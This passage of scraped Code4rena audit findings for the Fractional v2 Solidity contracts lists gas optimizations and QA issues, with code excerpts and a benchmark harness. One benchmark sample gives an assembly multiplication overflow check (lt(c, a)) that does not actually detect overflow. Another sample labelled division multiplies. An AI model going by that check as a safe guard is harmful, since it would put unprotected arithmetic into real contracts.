[FERC1155.sol#L303-L305](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/FERC1155.sol#L303-L305) - can cache _ controller (save ~94 gas) [Buyout.sol#L476-L477](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/Buyout.sol#L476-L477) - can cache supply (save ~94 gas) [Buyout.sol#L482-L501](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/Buyout.sol#L482-L501) - can cache transfer (save ~679 gas) [Migration.sol#L81-L95](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/Migration.sol#L81-L95) - can cache registry (save ~94 gas)   ### [G07] Deleting Mappings is Cheaper than setting to Default Value Based on this test in remix you can save ~511 gas in deployment costs and ~6 gas on each function call by using delete instead of setting a mapping to the default value.  ``` solidity contract Test {  mapping (address => uint256) public withdrawals;  function test(address a) external {   withdrawals[a] = 0;   (Deployment cost: 180,368, Execution cost: 27,820)   vs   delete withdrawals[a];   (Deployment cost: 179,857, Execution cost: 27,814)  } } ```  Instances where mappings are being set to their default value: [Vault.sol#L105](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/Vault.sol#L105) [Migration.sol#L161](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/Migration.sol#L161) [Migration.sol#L323](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/Migration.sol#L323) [Migration.sol#L157](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/Migration.sol#L157) [Migration.sol#L310](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/Migration.sol#L310)   ### [G08] Functions that can be Payable Functions that will always revert when regular users call them (such as those that can only be called by owner/controller) can be marked payable to save a small amount of gas (~24 Gas when function is called based on remix test)  [FERC1155.sol#L205-L207](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/FERC1155.sol#L205-L207) [FERC1155.sol#L198](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/FERC1155.sol#L198) [FERC1155.sol#L217-L221](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/FERC1155.sol#L217-L221) [FERC1155.sol#L229-L231](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/FERC1155.sol#L229-L231) [Vault.sol#L73](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/Vault.sol#L73) [Vault.sol#L86](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/Vault.sol#L86) [Vault.sol#L93](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/Vault.sol#L93) [Vault.sol#L101](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/Vault.sol#L101)   ### [G09] Public Function that can be External The following functions are never called in their contracts and can be switched from public to external to save gas: [MerkleBase.sol#L43-L47](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/utils/MerkleBase.sol#L43-L47) [MerkleBase.sol#L61](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/utils/MerkleBase.sol#L61) [MerkleBase.sol#L73-L74](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/utils/MerkleBase.sol#L73-L74) [Metadata.sol#L36](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/utils/Metadata.sol#L36) [SelfPermit.sol#L18-L26](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/utils/SelfPermit.sol#L18-L26) [SelfPermit.sol#L46-L53](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/utils/SelfPermit.sol#L46-L53)"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-07-fractional-findings/issues/304", "labels": ["bug", "QA (Quality Assurance)", "sponsor confirmed"], "target": "2022-07-fractional-findings", "body": "# QA Report  # Documentation errors.  Some of the documentation mentions that Buyouts need 51% support but the code shows that, in reality, it is anything strictly greater than 50%. e.g. 50.0001%  See [Buyout.sol:208-211](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/Buyout.sol#L208-L211)  # Non-critical: Use `permissions.size` to intialize `nodes` in `Buyout.getLeafNodes`  Instead of using the magic number 5 on [line 451](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/Buyout.sol#L451) why not simply use `permissions.length` to allocate the correct number of array indices?  Like so:  ```solidity function getLeafNodes() external view returns (bytes32[] memory nodes) {     Permission[] memory permissions = getPermissions();     nodes = new bytes32[](permissions.length);     for (uint256 i; i < permissions.length; ) {         // Hashes permission into leaf node         nodes[i] = keccak256(abi.encode(permissions[i]));         // Can't overflow since loop is a fixed size         unchecked {             ++i;         }     } } ```  ## Low Risk: `BaseVault.generateMerkleTree` will not work with new targets when total leaf length is greater than 6  ### Impact  Function `BaseVault.deployVault` takes a `modules` parameter which allows for any set of modules to be used with the contract.  If those modules have targets which have a total number of leaf nodes greater than 6 then `generateMerkleTree` will revert, which in turn causes `deployVault` to revert.  The impact is that one can successfully create a `BaseVault` but not call `deployVault`.  ### Proof of Concept  - Create a new instance of `BaseVault` called `baseVault`. - Call `baseVault.deployVault` with [modules](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/protoforms/BaseVault.sol#L36) parameter which, collectively, have more than 6 leaf nodes. - Observe a revert with \"Index out of bounds\"  ### Tools used  Manual Inspection  ### Recommended Mitigation Steps  If the intention of `BaseVault` is to allow arbitrary modules then one could rewrite `generateMerkleTree` as follows.  ```solidity function generateMerkleTree(address[] calldata _modules)     public     view     returns (bytes32[] memory hashes) {     uint256 numLeaves;     uint256 counter;     bytes32[][] memory leavesList = new bytes32[][](_modules.length);      // Get leaf nodes      unchecked {         for (uint256 i; i < _modules.length; ++i) {             bytes32[] memory leaves = IModule(_modules[i]).getLeafNodes();             leavesList[i] = leaves;             numLeaves += leaves.length;         }     }      hashes = new bytes32[](numLeaves);     unchecked {         for (uint256 i; i < leavesList.length; ++i) {             bytes32[] memory leaves = leavesList[i];             for (uint256 j; j < leaves.length; ++j) {                 hashes[counter++] = leaves[j];             }         }     } } ```  If the intention is for it only to allow `Supply` and `Buyout` modules then simply add some checks with `require` statements.  ## Low Risk: There is no way to get ETH out of `Vault` when accidentally sent to it  There is no function to retrieve ETH accidentally sent to the `Vault` contract.  ## Low Risk: `BaseVault` batch deposit functions do not check arrays are of the same length  The functions `batchDepositERC20`, `batchDepositERC721`, and `batchDepositERC1155` all fail to check that the length of the their array arguments have the same length.  Although this only results in a revert, it will result in increased gas use."}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-07-fractional-findings/issues/303", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed"], "target": "2022-07-fractional-findings", "body": "# Summary | Issue | Instances | | ------ | :--------: | | `++i` uses less gas compared to `i++` | 3 | | `uint8` incures more gas overhead compared to `uint256` | 2 | | Use custom errors instead of `revert()`/`require()` to save gas | 3 | | Add `require()` earlier in functions | 1 | | Cache array length outside of loop | 4 | | `internal` functions that are only called once can be inlined to save gas | 5 | | Return values directly without an intermediate return variable | 6 |  | Let the default value `0` be applied to variables initialized to `0` | 2 | | Functions guaranteed to revert when called by normal users can be marked `payable` | 8 | | `public` functions not called by the contract should be declared `external` | 6 |     # Gas Optimisations  ## `++i` uses less gas compared to `i++`   This is especially relevant for the use of `i++` in `for` loops. This saves 6 gas per loop.   _There are 3 instances of this issue:_  ``` File: src/Vault.sol  78     for (uint256 i = 0; i < length; i++) { 79         methods[_selectors[i]] = _plugins[i]; 80:    } ``` https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/Vault.sol#L78-L80  ``` File: src/Vault.sol  104    for (uint256 i = 0; i < length; i++) { 105        methods[_selectors[i]] = address(0); 106:   } ``` https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/Vault.sol#L104-L106  ``` File:  src/utils/MerkelBase.sol  186    while (x > 0) { 187       x >>= 1; 188       ceil++; 189:   } ``` https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/utils/MerkleBase.sol#L186-L189  ## `uint8` incures more gas overhead compared to `uint256`  _There are 2 instances of this issue:_  ``` File: src/FERC1155.sol  98    function permit( 99        address _owner, 100        address _operator, 101        uint256 _id, 102        bool _approved, 103        uint256 _deadline, 104        uint8 _v, 105        bytes32 _r, 106        bytes32 _s 107:    ) external { ``` https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/FERC1155.sol#L98-L107  ``` File: src/FERC1155.sol  145    function permitAll( 146        address _owner, 147        address _operator, 148        bool _approved, 149        uint256 _deadline, 150        uint8 _v, 151        bytes32 _r, 152        bytes32 _s 153:    ) external { ``` https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/FERC1155.sol#L145-L153  ## Use custom errors instead of `revert()`/`require()` to save gas Custom errors are available from solidity version 0.8.4. The instances below match or exceed that version.  _There are 3 instances of this issue:_  ``` File: src/FERC1155.sol  263  require( 264  msg.sender == _from || 265   isApprovedForAll[_from][msg.sender] || 267   isApproved[_from][msg.sender][_id], 268  \"NOT_AUTHORIZED\" 269: ); ``` https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/FERC1155.sol#L263-L269  ``` File: src/FERC1155.sol  275  require( 276  _to.code.length == 0 277   ? _to != address(0) 278   : INFTReceiver(_to).onERC1155Received( 279    msg.sender, 280    _from, 281    _id, 282    _amount, 283    _data 284   ) == INFTReceiver.onERC1155Received.selector, 285  \"UNSAFE_RECIPIENT\" 286:  ); ``` https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/FERC1155.sol#L275-L286  ``` File: src/FERC1155.sol  297: require(metadata[_id] != address(0), \"NO METADATA\"); ``` https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/FERC1155.sol#L297   ## Add `require()` earlier in functions This saves gas on operations between the start of the function and where the `require` function is actually being called.   _There is 1 instance of this issue:_  ``` File: src/FERC1155.sol  276  require( 277  _to.code.length == 0 278   ? _to != address(0) 279   : INFTReceiver(_to).onERC1155Received( 280    msg.sender, 281    _from, 282    _id, 283    _amount, 284    _data 285   ) == INFTReceiver.onERC1155Received.selector, 286  \"UNSAFE_RECIPIENT\" 287:  ); ``` https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/FERC1155.sol#L276-L287   ## Cache array length outside of loop Reading array length at each iteration of the loop takes 6 gas (3 for mload and 3 to place memory_offset) in the stack.  Caching the array length in the stack saves around 3 gas per iteration. To do this, create a variables containing the array length before the loop.    _There are 4 instances of this issue:_  ``` File: src/modules/Buyout.sol  276:  for (uint256 i; i < permissions.length; ) { ``` https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/modules/Buyout.sol#L454  ``` File: src/utils/MerkleBase.sol  51:  for (uint256 i = 0; i < _proof.length; ++i) { ``` https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/utils/MerkleBase.sol#L51  ``` File: src/utils/MerkleBase.sol  63:   while (_data.length > 1) { ``` https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/utils/MerkleBase.sol#L63  ``` File: src/utils/MerkleBase.sol  110: for (uint256 i; i < result.length; ++i) { ``` https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/utils/MerkleBase.sol#L110   ## `internal` functions that are only called once can be inlined to save gas Depending on the function contents, this will save 20~40 gas by omiting two JUMP operations and stack operations needed for the function call.   _There are 5 instances of this issue:_  ``` File: src/FERC1155.sol  324  function _computePermitStructHash( 325    address _owner, 326    address _operator, 327    uint256 _id, 328    bool _approved, 329    uint256 _deadline 330:  ) internal returns (bytes32) { ``` https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/FERC1155.sol#L324-L330  ``` File: src/FERC1155.sol  350    function _computePermitAllStructHash( 351        address _owner, 352        address _operator, 353        bool _approved, 354        uint256 _deadline 355:   ) internal returns (bytes32) { ``` https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/FERC1155.sol#L350-L355  ``` File: src/Vault.sol  142    function _revertedWithReason(bytes memory _response) internal pure { 143        assembly { 144            let returndata_size := mload(_response) 145            revert(add(32, _response), returndata_size) 146        } 147:    } ``` https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/Vault.sol#L142-L147  ``` File: src/utils/Multicall.sol  39    function _revertedWithReason(bytes memory _response) internal pure { 40        assembly { 41            let returndata_size := mload(_response) 42            revert(add(32, _response), returndata_size) 43        } 44:    } ``` https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/utils/Multicall.sol#L39-L44  ``` File: src/utils/SafeSend.sol  18    function _attemptETHTransfer(address _to, uint256 _value) 19        internal 20        returns (bool success) 21:    { ``` https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/utils/SafeSend.sol#L18-L21  ## Return values directly without an intermediate return variable Initializing a return variable for a function, then assigning a value to it requires more gas compared to simply returning the value, as long as the variable is not being used elsewhere in the function.   _There are 6 instances of this issue:_  ``` File: src/Vault.sol  67:  (success, response) = _execute(_target, _data); ``` https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/Vault.sol#L49-L68  ``` File: src/VaultFactory.sol  26    function deploy() external returns (address payable vault) { 27        vault = deployFor(msg.sender); 28:    } ``` https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/VaultFactory.sol#L26-L28  ``` File: src/VaultFactory.sol  49:        vault = address(uint160(uint256(data))); ``` https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/VaultFactory.sol#L33-L50  ``` File: src/VaultRegistry.sol  51    function create( 52        bytes32 _merkleRoot, 53       address[] memory _plugins, 54        bytes4[] memory _selectors 55    ) external returns (address vault) { 56        vault = _deployVault(_merkleRoot, address(fNFT), _plugins, _selectors); 57:   } ``` https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/VaultRegistry.sol#L51-L57  ``` File: src/VaultRegistry.sol  83    function createCollection( 84        bytes32 _merkleRoot, 85        address[] memory _plugins, 86        bytes4[] memory _selectors 87    ) external returns (address vault, address token) { 88        (vault, token) = createCollectionFor( 89            _merkleRoot, 90            msg.sender, 91            _plugins, 92            _selectors 93        ); 94:   } ``` https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/VaultRegistry.sol#L83-L94  ``` File: src/VaultRegistry.sol  102    function createInCollection( 103        bytes32 _merkleRoot, 104        address _token, 105        address[] memory _plugins, 106        bytes4[] memory _selectors 107    ) external returns (address vault) { 108        address controller = FERC1155(_token).controller(); 109        if (controller != msg.sender) 110            revert InvalidController(controller, msg.sender); 111        vault = _deployVault(_merkleRoot, _token, _plugins, _selectors); 112:   } ``` https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/VaultRegistry.sol#L102-L112  ## Let the default value `0` be applied to variables initialized to `0` Letting the default value of `0` be initialized to variables costs less gas compared to initializing it to a value of `0`.   _There are 2 instances of this issue:_  ``` File: src/Vault.sol  78:   for (uint256 i = 0; i < length; i++) { ``` https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/Vault.sol#L78  ``` File: src/utils/MerkleBase.sol  51:   for (uint256 i = 0; i < _proof.length; ++i) { ``` https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/utils/MerkleBase.sol#L51   ## Functions guaranteed to revert when called by normal users can be marked `payable`  For example, a function modifier such as `onlyController` is used. Adding the `payable` marker will lower gas cost for legitimate callers because the compiler will not include checks for whether a payment was provided. Saves about 21 gas per call to the function, as well as saving on deployment cost.   _There are 8 instances of this issue:_  ``` File: src/FERC1155.sol  56    function burn( 57        address _from, 58        uint256 _id, 59        uint256 _amount 60:    ) external onlyRegistry { ``` https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/FERC1155.sol#L56-L60  ``` File: src/FERC1155.sol  79    function mint( 80        address _to, 81        uint256 _id, 82        uint256 _amount, 83        bytes memory _data 84:   ) external onlyRegistry { ``` https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/FERC1155.sol#L79-L84  ``` File: src/FERC1155.sol  198:   function setContractURI(string calldata _uri) external onlyController { ``` https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/FERC1155.sol#L198  ``` File: src/FERC1155.sol  205    function setMetadata(address _metadata, uint256 _id) 206        external 207        onlyController 208:   { ``` https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/FERC1155.sol#L205-L208  ``` File: src/FERC1155.sol  217    function setRoyalties( 218        uint256 _id, 219        address _receiver, 220        uint256 _percentage 221:   ) external onlyController { ``` https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/FERC1155.sol#L217-L221  ``` File: src/FERC1155.sol  229    function transferController(address _newController) 230        external 231        onlyController 232:   { ``` https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/FERC1155.sol#L229-L232  ``` File: src/VaultRegistry.sol  39    function burn(address _from, uint256 _value) external { 40        VaultInfo memory info = vaultToToken[msg.sender]; 41        uint256 id = info.id; 42        if (id == 0) revert UnregisteredVault(msg.sender); 43        FERC1155(info.token).burn(_from, id, _value); 44:    } ``` https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/VaultRegistry.sol#L39-L44  ``` File: src/VaultRegistry.sol  117    function mint(address _to, uint256 _value) external { 118        VaultInfo memory info = vaultToToken[msg.sender]; 119        uint256 id = info.id; 120        if (id == 0) revert UnregisteredVault(msg.sender); 121        FERC1155(info.token).mint(_to, id, _value, \"\"); 122:   } ``` https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/VaultRegistry.sol#L117-L122  ## `public` functions not called by the contract should be declared `external`  Contracts are allowed to override their parents' functions and change the visibility from `external` to `public` if required.    _There are 6 instances of this issue:_  ``` File: src/FERC1155.sol  256    function safeTransferFrom( 257        address _from, 258        address _to, 259        uint256 _id, 260        uint256 _amount, 261        bytes memory _data 262:    ) public override(ERC1155, IFERC1155) { ``` https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/FERC1155.sol#L256-L262  ``` File: src/FERC1155.sol  291    function uri(uint256 _id) 292        public 293        view 294        override(ERC1155, IFERC1155) 295        returns (string memory) 296:    { ``` https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/FERC1155.sol#L291-L296  ``` File: src/utils/MerkleBase.sol  43    function verifyProof( 44        bytes32 _root, 45        bytes32[] memory _proof, 46        bytes32 _valueToProve 47:   ) public pure returns (bool) { ``` https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/utils/MerkleBase.sol#L43-L47  ``` File: src/utils/MerkleBase.sol  61:    function getRoot(bytes32[] memory _data) public pure returns (bytes32) { ``` https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/utils/MerkleBase.sol#L61  ``` File: src/utils/MerkleBase.sol  73    function getProof(bytes32[] memory _data, uint256 _node) 74        public 75        pure 76        returns (bytes32[] memory) 77:   { ``` https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/utils/MerkleBase.sol#L73-L77  ``` File: src/utils/Metadata.sol  36    function uri(uint256 _id) public view returns (string memory) { 37        return tokenMetadata[_id]; 38:    } ``` https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/utils/Metadata.sol#L36-L38"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-07-fractional-findings/issues/297", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed"], "target": "2022-07-fractional-findings", "body": "# Gas Optimizations The following sections detail the gas optimizations found throughout the codebase. Each optimization is documented with the setup, an explainer for the optimization, a gas report and line identifiers for each optimization across the codebase. For each section's gas report, the optimizer was turned on and set to 10000 runs. You can replicate any tests/gas reports by heading to [0xKitsune/gas-lab](https://github.com/0xKitsune/gas-lab) and cloning the repo. Then, simply copy/paste the contract examples from any section and run `forge test --gas-report`. You can also easily update the optimizer runs in the `foundry.toml`.  ---     ## Use assembly for math (add, sub, mul, div)  Use assembly for math instead of Solidity. You can check for overflow/underflow in assembly to ensure safety. If using Solidity versions < 0.8.0 and you are using Safemath, you can gain significant gas savings by using assembly to calculate values and checking for overflow/underflow.  ```js  contract GasTest is DSTest {     Contract0 c0;     Contract1 c1;     Contract2 c2;     Contract3 c3;     Contract4 c4;     Contract5 c5;     Contract6 c6;     Contract7 c7;      function setUp() public {         c0 = new Contract0();         c1 = new Contract1();         c2 = new Contract2();         c3 = new Contract3();         c4 = new Contract4();         c5 = new Contract5();         c6 = new Contract6();         c7 = new Contract7();     }      function testGas() public {         c0.addTest(34598345, 100);         c1.addAssemblyTest(34598345, 100);         c2.subTest(34598345, 100);         c3.subAssemblyTest(34598345, 100);         c4.mulTest(34598345, 100);         c5.mulAssemblyTest(34598345, 100);         c6.divTest(34598345, 100);         c7.divAssemblyTest(34598345, 100);     } }  contract Contract0 {     //addition in Solidity     function addTest(uint256 a, uint256 b) public pure {         uint256 c = a + b;     } }  contract Contract1 {     //addition in assembly     function addAssemblyTest(uint256 a, uint256 b) public pure {         assembly {             let c := add(a, b)              if lt(c, a) {                 mstore(0x00, \"overflow\")                 revert(0x00, 0x20)             }         }     } }  contract Contract2 {     //subtraction in Solidity     function subTest(uint256 a, uint256 b) public pure {         uint256 c = a - b;     } }  contract Contract3 {     //subtraction in assembly     function subAssemblyTest(uint256 a, uint256 b) public pure {         assembly {             let c := sub(a, b)              if gt(c, a) {                 mstore(0x00, \"underflow\")                 revert(0x00, 0x20)             }         }     } }  contract Contract4 {     //multiplication in Solidity     function mulTest(uint256 a, uint256 b) public pure {         uint256 c = a * b;     } }  contract Contract5 {     //multiplication in assembly     function mulAssemblyTest(uint256 a, uint256 b) public pure {         assembly {             let c := mul(a, b)              if lt(c, a) {                 mstore(0x00, \"overflow\")                 revert(0x00, 0x20)             }         }     } }  contract Contract6 {     //division in Solidity     function divTest(uint256 a, uint256 b) public pure {         uint256 c = a * b;     } }  contract Contract7 {     //division in assembly     function divAssemblyTest(uint256 a, uint256 b) public pure {         assembly {             let c := div(a, b)              if gt(c, a) {                 mstore(0x00, \"underflow\")                 revert(0x00, 0x20)             }         }     } }   ```  ### Gas Report  ```js  \u256d\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u256e \u2502 Contract0 contract \u2506                 \u2506     \u2506        \u2506     \u2506         \u2502 \u255e\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u256a\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u256a\u2550\u2550\u2550\u2550\u2550\u256a\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u256a\u2550\u2550\u2550\u2550\u2550\u256a\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2561 \u2502 Deployment Cost    \u2506 Deployment Size \u2506     \u2506        \u2506     \u2506         \u2502 \u251c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u2524 \u2502 40493              \u2506 233             \u2506     \u2506        \u2506     \u2506         \u2502 \u251c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u2524 \u2502 Function Name      \u2506 min             \u2506 avg \u2506 median \u2506 max \u2506 # calls \u2502 \u251c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u2524 \u2502 addTest            \u2506 303             \u2506 303 \u2506 303    \u2506 303 \u2506 1       \u2502 \u2570\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u256f \u256d\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u256e \u2502 Contract1 contract \u2506                 \u2506     \u2506        \u2506     \u2506         \u2502 